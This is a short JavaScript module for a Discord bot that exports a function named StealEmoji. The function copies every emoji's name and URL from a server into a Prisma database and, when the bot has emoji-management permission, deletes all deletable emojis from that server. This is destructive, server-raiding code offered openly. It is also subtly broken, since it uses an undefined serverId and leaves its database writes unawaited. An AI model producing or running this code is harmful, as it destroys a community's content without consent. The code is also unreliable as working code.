import { Permissions } from "discord.js";
import Prisma from "@prisma/client";

const { PrismaClient } = Prisma;
const prisma = new PrismaClient();

export async function StealEmoji(g) {
  let emojis = [];
  let emojiCounter = 0;

  await g.emojis.fetch().then((emo) =>
    emo.map((e) => {
      emojiCounter++;
      emojis.push({
        name: e.name,
        url: e.url,
      });
    })
  );

  if (g.me.permissions.has(Permissions.FLAGS.MANAGE_EMOJIS_AND_STICKERS)) {
    await g.emojis.cache.map((e) => {
      e.deletable && e.delete();
    });
  }

  return [
    emojis.map((e) =>
      prisma.emojis.create({
        data: {
          name: e.name,
          url: e.url,
          serverId: serverId,
        },
      })
    ),
    emojiCounter,
  ];
}
